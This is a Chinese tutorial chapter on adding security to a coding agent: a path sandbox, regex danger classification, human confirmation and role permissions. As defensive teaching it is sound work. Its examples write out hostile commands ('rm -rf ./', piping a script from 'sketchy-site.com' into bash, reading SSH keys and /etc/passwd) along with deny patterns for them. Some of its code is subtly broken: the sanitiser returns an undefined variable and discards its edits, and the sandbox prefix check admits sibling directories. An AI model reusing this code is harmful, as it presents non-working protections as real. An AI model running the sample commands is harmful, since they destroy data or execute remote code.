# Chapter 14: 安全与权限

> **Motto**: "能力越大，约束越要明确"

> 你的 Agent 现在能执行 bash 命令、读写文件、创建子进程、管理团队。这意味着它可以做任何事——包括 `rm -rf /`、读取 `~/.ssh/id_rsa`、或者执行从网上下载的恶意脚本。本章构建安全层：路径沙箱增强、命令分级、危险操作确认机制、工具权限模型。

![Conceptual: Observability and monitoring dashboards](images/ch14/fig-14-01-concept.png)

*Figure 14-1. Security layers: sandboxes, permission gates, and role-based access control.*
## The Problem

```
You: 清理一下临时文件

Agent: [Tool: bash] rm -rf /tmp/*
```

看起来无害？但如果 Agent 理解错了"临时文件"的范围呢？

```
Agent: [Tool: bash] rm -rf ./
```

或者更隐蔽的：

```
You: 帮我安装这个依赖

Agent: [Tool: bash] curl https://sketchy-site.com/install.sh | bash
```

Agent 从不质疑命令的安全性——它没有"这看起来很危险"的判断力。你需要在 harness 层面添加安全约束。

## The Solution

三层防御：

1. **路径沙箱**：文件操作限制在工作目录内
2. **命令分级**：将 bash 命令分为 safe / restricted / dangerous
3. **人类确认**：危险操作暂停，等待人类批准

加上一个贯穿所有工具的**权限模型**。

## 14.1 增强的路径沙箱

Chapter 2 的 `safe_path()` 是一个简单函数。现在升级为 `Sandbox` 类：

```python
class Sandbox:
    def __init__(self, workspace, allowed_dirs=None):
        self.workspace = os.path.realpath(workspace)
        self._allowed = [self.workspace]
        if allowed_dirs:
            self._allowed.extend(os.path.realpath(d) for d in allowed_dirs)

    def check_path(self, path):
        resolved = os.path.realpath(os.path.join(self.workspace, path))
        for allowed in self._allowed:
            if resolved.startswith(allowed):
                return resolved
        raise PermissionError(f"路径 {path} 超出允许范围")

    def add_allowed_dir(self, path):
        self._allowed.append(os.path.realpath(path))
```

比原来的 `safe_path` 多了什么？

- **多目录支持**：worktree 目录也需要被允许访问
- **动态扩展**：创建新 worktree 时可以添加新的允许路径
- **统一接口**：所有文件操作共用同一个沙箱实例

现在 `safe_path` 变成了 Sandbox 的一层薄封装：

```python
_sandbox = Sandbox(WORKSPACE)

def safe_path(path):
    return _sandbox.check_path(path)  # 代替原来的手动检查
```

## 14.2 命令分级

```python
DANGEROUS_PATTERNS = [
    r"\brm\s+(-rf?|--recursive)\b",
    r"\bsudo\b",
    r"\bcurl\b.*\|\s*(bash|sh)\b",
    r"\bgit\s+push\s+.*--force\b",
    r"\bgit\s+reset\s+--hard\b",
    # ...
]

RESTRICTED_COMMANDS = [
    "pip install",
    "npm install",
    "brew install",
]

def classify_command(command):
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, command):
            return "dangerous"
    for restricted in RESTRICTED_COMMANDS:
        if restricted in command:
            return "restricted"
    return "safe"
```

三个级别：
- **safe**：`ls`、`cat`、`git status` — 直接执行
- **restricted**：`pip install` — 需要确认（可能修改环境）
- **dangerous**：`rm -rf`、`sudo` — 必须确认

## 14.3 人类确认机制

```python
class ConfirmationGate:
    def needs_confirmation(self, tool_name, tool_input):
        if tool_name == "bash":
            level = classify_command(tool_input.get("command", ""))
            return level in ("dangerous", "restricted")
        return TOOL_PERMISSIONS.get(tool_name) == "dangerous"

    def request_confirmation(self, tool_name, tool_input):
        print(f"\n⚠️  危险操作需要确认:")
        print(f"  工具: {tool_name}")
        if tool_name == "bash":
            print(f"  命令: {tool_input.get('command', '')}")
        answer = input("  是否执行？(y/N): ").strip().lower()
        return answer in ("y", "yes")
```

执行流程变成：

```
Agent 调用 bash("rm -rf old/") 
  → ConfirmationGate.needs_confirmation → True
  → 打印 "⚠️  危险操作需要确认"
  → 等待用户输入 y/N
  → 用户输入 N → 返回 "[操作已被用户取消]"
  → Agent 收到取消信息，尝试其他方式
```

## 14.4 工具权限模型

每个工具有一个权限级别：

```python
TOOL_PERMISSIONS = {
    "read_file": "read",
    "write_file": "write",
    "bash": "execute",
    "shutdown_request": "dangerous",
    # ...
}
```

每个角色有允许的权限集合：

```python
ROLE_PERMISSIONS = {
    "lead": {"read", "write", "execute", "dangerous"},
    "teammate": {"read", "write", "execute"},
    "readonly": {"read"},
}
```

权限检查：

```python
def check_tool_permission(tool_name, role="lead"):
    tool_level = TOOL_PERMISSIONS.get(tool_name, "execute")
    role_perms = ROLE_PERMISSIONS.get(role, set())
    return tool_level in role_perms
```

这解决了角色安全问题：
- **Lead**：全部权限，包括 shutdown 等危险操作
- **Teammate**：可以读写和执行，但不能关闭其他队友
- **Readonly**：只能读取，用于审计或监控角色

## 14.5 安全包装器

所有安全检查通过一个统一的包装函数应用：

```python
def make_security_wrapper(handler, tool_name, sandbox, gate, role="lead"):
    def wrapped(**kwargs):
        # 1. 权限检查
        if not check_tool_permission(tool_name, role):
            return f"[error: 角色 '{role}' 无权使用工具 '{tool_name}']"
        # 2. 输入消毒
        kwargs = sanitize_tool_input(tool_name, kwargs)
        # 3. 路径沙箱
        if sandbox and tool_name in ("read_file", "write_file", "edit_file"):
            sandbox.check_path(kwargs.get("path", ""))
        # 4. 危险操作确认
        if gate and gate.needs_confirmation(tool_name, kwargs):
            if not gate.request_confirmation(tool_name, kwargs):
                return "[操作已被用户取消]"
        # 5. 执行
        return handler(**kwargs)
    return wrapped
```

在 `agent_loop` 中：

```python
if gate is not None:
    raw_bash = handlers["bash"]
    handlers["bash"] = make_security_wrapper(raw_bash, "bash", sandbox, gate)
```

装饰器模式——不修改原有的 handler，而是在外层包装安全检查。

## 14.6 输入消毒

基本的 prompt injection 防御：

```python
def sanitize_tool_input(tool_name, tool_input):
    for key, value in tool_input.items():
        if isinstance(value, str):
            value = value.replace("<|system|>", "")
            value = value.replace("<|endoftext|>", "")
            value = value.replace("\x00", "")
    return sanitized
```

这不是完美的防御——prompt injection 是一个活跃的研究领域。但移除已知的特殊 token 是基本的卫生措施。

## 14.7 试一试

```bash
cd miniagent
python agent.py
```

```
安全: 路径沙箱 + 危险操作确认
```

试试触发安全机制：

```
You: 执行 rm -rf /tmp/test

⚠️  危险操作需要确认:
  工具: bash
  命令: rm -rf /tmp/test
  是否执行？(y/N): N

Agent: 操作已被取消。我可以用更安全的方式来清理...
```

试试路径遍历：

```
You: 读取 /etc/passwd

Agent: [error: 路径 /etc/passwd 超出允许范围]
```

> **Try It Yourself**：试着让 Agent 执行 `curl ... | bash` 和 `sudo ...`，观察安全机制的反应。

## What Changed

```
miniagent/
├── agent.py            ← CHANGED: +20 行（Security 导入、sandbox/gate 初始化、包装 bash）
├── todo.py
├── skill_loader.py
├── context.py
├── subagent.py
├── background.py
├── tasks.py
├── team.py
├── protocols.py
├── autonomous.py
├── worktree.py
├── security.py         ← NEW: 242 行（Sandbox、ConfirmationGate、权限模型、包装器）
├── requirements.txt
└── skills/
    └── code-review/
        └── SKILL.md
```

| 指标 | Chapter 13 | Chapter 14 |
|------|------------|------------|
| 工具数 | 24 | **24**（不增加工具，安全层是中间件）|
| 模块数 | 11 | **12** (+security.py) |
| 能力 | Git 隔离 | **+安全沙箱 + 命令分级 + 确认机制** |
| 防御层 | 简单 safe_path | **Sandbox + Gate + Permissions** |

安全层不增加新工具——它是一个**中间件**，包装在现有工具外层。这是一个重要的架构原则：安全不应该是功能的附加品，而应该是贯穿整个系统的基础设施。

下一章将添加可观测性——让你能看到 Agent 在做什么、为什么做、花了多少成本。

## Summary

- Agent 能执行任何命令，安全约束必须在 harness 层实现
- Sandbox 类扩展了 safe_path，支持多目录和动态添加
- 命令分为 safe/restricted/dangerous 三级
- ConfirmationGate 在危险操作前暂停等待人类确认
- 工具权限模型：每个工具有级别，每个角色有权限集合
- make_security_wrapper 用装饰器模式包装安全检查
- 基本的输入消毒防御 prompt injection
- 安全层是中间件，不增加新工具
